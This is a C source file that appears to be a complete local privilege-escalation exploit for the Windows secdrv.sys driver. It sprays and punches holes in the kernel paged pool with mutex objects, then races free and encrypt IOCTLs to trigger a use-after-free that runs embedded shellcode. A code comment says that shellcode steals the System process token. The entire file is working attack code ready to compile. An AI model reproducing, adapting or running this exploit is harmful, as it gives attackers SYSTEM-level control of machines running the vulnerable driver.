

#include "stdafx.h"
#include <Windows.h>

#define DEVICE_NAME L"\\\\.\\secdrv"
#define IO_CONTROL_CODE 0x0CA002813
#define ALLOCATION_TAG 0x13371337
#define ALLOCATION_SIZE 0x20000000
#define FREE_RACER_BETWEEN_SLEEP_TIME 220
#define FAKE_SPRAY_AMOUNT 5000
#define INITIAL_POOL_SPRAY_AMOUNT 15000
#define SHELLCODE_SIZE 78
#define NOP_SLED_SIZE 0x40
#define CHUNK_2_SIZE 0xC
#define CHUNK_1_PCHUNK_2_OFFSET 0x28

DWORD WINAPI FreeRacerThread(LPVOID lpParam);
void DispatchEnrypter(DWORD dwTag, DWORD dwAllocationSize);
void FreeAllWithTag(DWORD dwTag);
BOOL AllocateWithTag(DWORD dwTag);
void SprayFakeChunkInPagedPool(DWORD dwAmount);
void PunchPagedPool(DWORD dwAmount);
void FreePagedPoolSpray();

HANDLE ghSecDrv;
HANDLE ghFreeStartEvent;
HANDLE gphMutexFakeChunkSpray[FAKE_SPRAY_AMOUNT * 2];
HANDLE gphMutexSpray[INITIAL_POOL_SPRAY_AMOUNT * 2];
PDWORD gpdwFakeChunk2;
PVOID gpbShellcode;

// stealing System process token :)
CHAR shellcode[SHELLCODE_SIZE] = {0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x80, 0x50, 0x01, 0x00, 0x00, 0x81, 0xb8, 0x6c,
								  0x01, 0x00, 0x00, 0x63, 0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d,
								  0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3, 0x83, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x74,
							      0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xea, 0x8b, 0x88,
								  0xf8, 0x00, 0x00, 0x00, 0x89, 0x8b, 0xf8, 0x00, 0x00, 0x00, 0x61, 0xc2, 0x0c, 0x00};
int main()
{
	DWORD lpParam;
	HANDLE hThread;
	BOOL ok = TRUE;

	ghSecDrv = CreateFileW(DEVICE_NAME,
							GENERIC_READ | GENERIC_WRITE,
							FILE_SHARE_READ | FILE_SHARE_WRITE,
							NULL,
							OPEN_EXISTING,
							NULL,
							NULL);

	if (ghSecDrv == INVALID_HANDLE_VALUE)
	{
		printf("[*] Cannot open device, error code 0x%x\n", GetLastError());
		return 0;
	}
	else
	{
		printf("[*] Device %ws opened successfuly\n", DEVICE_NAME);
	}

	// create event in order to trigger the FreeRacerThread at the right moment
	ghFreeStartEvent = CreateEvent(NULL,
		TRUE,	// manual reset event
		FALSE,	// initial state is nonsignaled
		NULL);

	// prepare fake chunk and shellcode
	gpbShellcode = VirtualAlloc(NULL,
								SHELLCODE_SIZE + NOP_SLED_SIZE,
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);
	if (!gpbShellcode)
	{
		
		goto cleanup;
	}
	
	printf("[*] Shellcode located at: 0x%x\n", (DWORD) gpbShellcode);
	// init fake chunk
	gpdwFakeChunk2 = (PDWORD) malloc(CHUNK_2_SIZE);
	gpdwFakeChunk2[0] = (DWORD)gpbShellcode + NOP_SLED_SIZE; // we will have a nop sled before the shellcode
	
	// copy shellcode to the buffer
	memset(gpbShellcode, 0x90, NOP_SLED_SIZE + SHELLCODE_SIZE); // set with nop sled
	memcpy((PVOID)((DWORD)gpbShellcode + NOP_SLED_SIZE), shellcode, SHELLCODE_SIZE);

	printf("[*] Freeing all previous allocation with the same tag, making sure we race on the same entry\n");
	FreeAllWithTag(ALLOCATION_TAG);

	printf("[*] Sending IOCTL type 0x96, to allocate with tag 0x%x...\n", ALLOCATION_TAG);
	ok = AllocateWithTag(ALLOCATION_TAG);

	if(!ok)
	{
		printf("[*] Failed to send IOCTL type 0x96 to allocate the chunk, aborting...\n");
		goto cleanup;
	}

	SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_BEGIN);

	lpParam = ALLOCATION_TAG;

	printf("[*] Creating the FreeRacerThread in order to win the race condition...\n");

	hThread = CreateThread(NULL,
							0,
							(LPTHREAD_START_ROUTINE)FreeRacerThread,
							&lpParam, // tag
							NULL,
							NULL);

	if (hThread == INVALID_HANDLE_VALUE)
	{
		printf("[*] Could not create thread FreeRacerThread, error code 0x%x\n", GetLastError());
		goto cleanup;
	}

	SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
	Sleep(100);

	printf("[*] Dispatching the Encryper IOCTL, triggering the UAF (hopefully)\n");
	DispatchEnrypter(ALLOCATION_TAG, ALLOCATION_SIZE);

	FreePagedPoolSpray();

	printf("[*] Finished successfully!\n\n");
	printf("-----------------------------------------------\n WITH GREAT POWER COMES GREAT RESPONSIBILITY \n----------------------------------------------- \n\n");

cleanup:
	free(gpdwFakeChunk2);
	CloseHandle(ghFreeStartEvent);
	CloseHandle(ghSecDrv);
	return 0;
}

void PunchPagedPool(DWORD dwAmount)
{
	SIZE_T i;
	WCHAR szName[0x50];
	HANDLE hMutex;
	SIZE_T step;

	step = 0x10;

	// spray the pool
	for (i = 0; i < dwAmount; i++)
	{
		_snwprintf_s(szName, 0x30, L"%.5dBBBBBBBBBBBBBBBBBBB", i);
		//printf("%ws\n", szName);

		hMutex = CreateMutexW(NULL, FALSE, szName);
		if (hMutex == INVALID_HANDLE_VALUE)
		{
			printf("[*] Could not create new Mutex object\n");
		}
		gphMutexSpray[i] = hMutex;
	}

	// create holes
	for (i = dwAmount - (step * 500); i < dwAmount; i += step)
	{
		hMutex = gphMutexSpray[i];
		if (hMutex != INVALID_HANDLE_VALUE)
		{
			CloseHandle(hMutex);
		}
	}
}

void SprayFakeChunkInPagedPool(DWORD dwAmount)
{
	SIZE_T i;
	WCHAR szName[0x50];
	HANDLE hMutex;

	//snprintf(szName, 0x30, "%dAAAAAAAAAAAAAAAAAAA", i); %d = 5 chars, 0xA bytes.

	for (i = 0; i < dwAmount; i++)
	{
		_snwprintf_s(szName, 0x30, L"%.5dAAAAAAAAAAAAAAAAAAA", i);
		*((PDWORD)(szName + (CHUNK_1_PCHUNK_2_OFFSET / 2))) = (DWORD) gpdwFakeChunk2; // set the pointer to chunk_2 in the fake chunk_1

		hMutex = CreateMutexW(NULL, FALSE, szName);

		gphMutexFakeChunkSpray[i] = hMutex;
	}
}


BOOL AllocateWithTag(DWORD dwTag)
{
	PDWORD pdwInBuffer;
	PDWORD pdwOutBuffer;
	DWORD bytesReturned;
	BOOL result;

	pdwInBuffer = (PDWORD) malloc(0x30);
	pdwOutBuffer = (PDWORD) malloc(0x30);

	memset(pdwInBuffer, 0, 0x30);
	memset(pdwOutBuffer, 0, 0x30);

	pdwInBuffer[0] = dwTag;
	pdwInBuffer[3] = 0x10; // offset 0xC
	pdwInBuffer[1] = 0x96; // offset 0x4
	pdwInBuffer[4] = 0xAAAAAAAA; // offset 0x10

	printf("[*] Spraying and creating holes in the PagedPool, we need a good spot for the UAF chunk\n");
	PunchPagedPool(INITIAL_POOL_SPRAY_AMOUNT);

	if (!DeviceIoControl(ghSecDrv,
						IO_CONTROL_CODE,
						pdwInBuffer,
						0x10,
						pdwOutBuffer,
						0x10,
						&bytesReturned,
						NULL))
	{
		printf("[*] DeviceIoControl failed, error code 0x%x\n", GetLastError());
		result = FALSE;
	}
	else
	{
		result = TRUE;
	}

	free(pdwInBuffer);
	free(pdwOutBuffer);

	return result;
}


void FreeAllWithTag(DWORD dwTag)
{
	PDWORD pdwInBuffer;
	PDWORD pdwOutBuffer;
	DWORD bytesReturned;

	pdwInBuffer = (PDWORD) malloc(0x20);
	pdwOutBuffer = (PDWORD) malloc(0x10);

	memset(pdwInBuffer, 0, 0x20);
	memset(pdwOutBuffer, 0, 0x10);

	pdwInBuffer[0] = dwTag;
	pdwInBuffer[3] = 0; // offset 0xC
	pdwInBuffer[1] = 0x98; // offset 0x4
	pdwInBuffer[4] = 0xAAAAAAAA; // offset 0x10

	for (size_t i = 0; i < 64; i++)
	{
		if (DeviceIoControl(ghSecDrv,
							IO_CONTROL_CODE,
							pdwInBuffer,
							0x10,
							pdwOutBuffer,
							0x10,
							&bytesReturned
							, NULL))
		{
			printf("[*] Allocation at index %d with tag 0x%x was freed\n", i, dwTag);
		}
	}

	free(pdwInBuffer);
	free(pdwOutBuffer);
}


void DispatchEnrypter(DWORD dwTag, DWORD dwAllocationSize)
{
	PDWORD pdwInBuffer;
	PDWORD pdwOutBuffer;
	DWORD bytesReturned;

	pdwInBuffer = (PDWORD)VirtualAlloc(NULL, dwAllocationSize + 0x10, MEM_COMMIT, PAGE_READWRITE);
	pdwOutBuffer = (PDWORD)VirtualAlloc(NULL, dwAllocationSize + 0x10, MEM_COMMIT, PAGE_READWRITE);

	if (!pdwInBuffer || !pdwOutBuffer)
	{
		printf("[*] VirtualAlloc failed, error code 0x%x\n", GetLastError());
		return;
	}
	printf("[*] Successfully allocated huge regions with size: 0x%x\n", dwAllocationSize);

	pdwInBuffer[0] = dwTag;
	pdwInBuffer[3] = dwAllocationSize; // offset 0xC
	pdwInBuffer[1] = 0x97; // offset 0x4
	pdwInBuffer[4] = 0xAAAAAAAA; // offset 0x10

	printf("[*] Sending IOCTL type 0x97 and signaling the FreeStartEvent...\n");

	SetEvent(ghFreeStartEvent);
	Sleep(1);

	if (!DeviceIoControl(ghSecDrv,
		IO_CONTROL_CODE,
		pdwInBuffer,
		dwAllocationSize,
		pdwOutBuffer,
		dwAllocationSize,
		&bytesReturned
		, NULL))
	{
		printf("[*] Encrypter DeviceIoControl finished with error: 0x%x\n", GetLastError());
		goto cleanup;
	}
	else
	{
		printf("[*] Encrypter DeviceIoControl finsihed\n");
	}

cleanup:
	VirtualFree(pdwInBuffer, dwAllocationSize + 0x10, MEM_RELEASE);
	VirtualFree(pdwOutBuffer, dwAllocationSize + 0x10, MEM_RELEASE);
}


DWORD WINAPI FreeRacerThread(LPVOID lpParam)
{
	PDWORD pdwInBuffer;
	PDWORD pdwOutBuffer;
	DWORD bytesReturned;
	DWORD tag;
	HANDLE hDevice;

	hDevice = CreateFileW(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[*] FreeRacerThread cannot open device, error code 0x%x\n", GetLastError());
		return 0;
	}

	tag = *(DWORD *) lpParam;

	pdwInBuffer = (PDWORD)malloc(0x20);
	pdwOutBuffer = (PDWORD)malloc(0x10);

	memset(pdwInBuffer, 0, 0x20);
	memset(pdwOutBuffer, 0, 0x10);

	pdwInBuffer[0] = tag;
	pdwInBuffer[3] = 0; // offset 0xC
	pdwInBuffer[1] = 0x98; // offset 0x4
	pdwInBuffer[4] = 0xAAAAAAAA; // offset 0x10

	printf("[*] FreeRacerThread thread started on tag 0x%x...\n", ALLOCATION_TAG);

	printf("[*] FreeRacerThread waiting for the event to trigger\n");

	WaitForSingleObject(ghFreeStartEvent, INFINITE);

	Sleep(FREE_RACER_BETWEEN_SLEEP_TIME);

	if (!DeviceIoControl(hDevice,
						IO_CONTROL_CODE,
						pdwInBuffer,
						0x10,
						pdwOutBuffer,
						0x10,
						&bytesReturned
						, NULL))
	{
		printf("[*] Free racer failed, DeviceIoControl returned error code 0x%x\n", GetLastError());
		goto cleanup;
	}
	
	SprayFakeChunkInPagedPool(FAKE_SPRAY_AMOUNT);

	printf("[*] Free racer successfully freed the allocation, shellcode should be run now :)\n");

cleanup:
	free(pdwInBuffer);
	free(pdwOutBuffer);
	return 0;
}

void FreePagedPoolSpray()
{
	SIZE_T i;
	HANDLE hMutex;

	for (i = 0; i < INITIAL_POOL_SPRAY_AMOUNT; i++)
	{
		hMutex = gphMutexSpray[i];
		if (hMutex != INVALID_HANDLE_VALUE)
		{
			CloseHandle(hMutex);
		}
	}

	for (i; i < FAKE_SPRAY_AMOUNT; i++)
	{
		hMutex = gphMutexFakeChunkSpray[i];
		if (hMutex != INVALID_HANDLE_VALUE)
		{
			CloseHandle(hMutex);
		}
	}
}